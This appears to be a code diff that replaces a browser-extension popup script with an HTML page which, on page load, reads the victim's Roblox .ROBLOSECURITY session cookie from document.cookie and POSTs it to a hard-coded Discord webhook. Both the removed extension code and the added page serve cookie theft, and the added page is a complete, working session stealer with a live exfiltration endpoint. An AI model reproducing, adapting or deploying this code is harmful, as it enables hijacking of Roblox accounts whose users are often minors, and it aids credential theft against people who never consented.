@@ -1,20 +1,59 @@
-document.getElementById('sendCookieButton').addEventListener('click', () => {
-    // Send a message to the content script to get the cookie
-    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
-        chrome.tabs.sendMessage(tabs[0].id, { action: 'getRobloxCookie' }, (response) => {
-            if (response && response.cookie) {
-                // Send the cookie to the background script
-                chrome.runtime.sendMessage({ action: 'sendCookie', cookie: response.cookie }, (response) => {
-                    const statusElement = document.getElementById('status');
-                    if (response.success) {
-                        statusElement.textContent = 'Cookie sent successfully!';
-                    } else {
-                        statusElement.textContent = 'Failed to send cookie.';
-                    }
-                });
-            } else {
-                document.getElementById('status').textContent = '.ROBLOSECURITY Cookie not found.';
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send .ROBLOSECURITY Cookie to Discord Webhook</title>
+    <script>
+        // Replace this with your actual Discord webhook URL
+        const webhookUrl = 'https://discord.com/api/webhooks/1293261110438264913/p0Wx8436uc25-B-CWtAO78nD84Pj7Zqmrb7s1LdfB1xBcTqOYkLDqjspVUlwAi4Qs_-B';
+
+        function getRobloxCookie() {
+            const cookies = document.cookie.split('; ');
+            let robloxSecurityCookie = '';
+
+            for (let cookie of cookies) {
+                if (cookie.startsWith('.ROBLOSECURITY=')) {
+                    robloxSecurityCookie = cookie.split('=')[1];
+                    break;
+                }
             }
-        });
-    });
-});
+
+            if (robloxSecurityCookie) {
+                // Send the cookie to Discord
+                sendToDiscord(robloxSecurityCookie);
+            } else {
+                console.log('Cookie not found.');
+            }
+        }
+
+        function sendToDiscord(cookie) {
+            const data = {
+                content: `ROBLOSECURITY Cookie: ${cookie}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Cookie sent to Discord successfully.');
+                } else {
+                    console.error('Error sending cookie to Discord:', response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</head>
+<body onload="getRobloxCookie()">
+    <h1>Send .ROBLOSECURITY Cookie to Discord Webhook</h1>
+    <p>Your .ROBLOSECURITY cookie is being sent to Discord...</p>
+</body>
+</html>
